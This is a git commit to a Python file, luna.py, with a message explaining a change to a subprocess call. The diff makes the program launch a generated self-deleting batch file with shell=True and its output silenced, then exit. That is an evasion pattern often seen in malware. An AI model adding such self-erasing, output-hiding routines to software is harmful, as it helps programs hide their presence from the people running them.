d83dbf0ed8996b4075c5d3ad35071b4494a6c08c
Serpensin <wissmann.matti@gmail.com>
2024-04-16 10:43:59 +0200

    The most significant change in the code is the modification of the `subprocess.Popen` function in the `luna.py` file. The function now includes additional arguments and changes in its settings, which allows for more control over the subprocess's interaction with the parent process.
    Changes:
    1. The `subprocess.Popen` function in the `luna.py` file has been updated. Previously, it was called with only one argument, `batch_path`, and `shell` was set to `False`. Now, `shell` is set to `True`.
    2. Additional arguments have been added to the `subprocess.Popen` function: `stdin`, `stdout`, `stderr`, and `close_fds`. These arguments are set to `subprocess.PIPE` and `True` respectively. This allows the subprocess to have its input/output/error pipes redirected and its file descriptors closed.

--- luna.py
+++ luna.py
@@ -834,7 +834,7 @@ del "%~f0"
                 batch_path = os.path.join(os.path.dirname(path), "self_delete.bat")
                 with open(batch_path, "w") as batch_file:
                     batch_file.write(batch_content)
-                subprocess.Popen(batch_path, shell=False)
+                subprocess.Popen(batch_path, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
             sys.exit()
         except Exception:
             sys.exit()
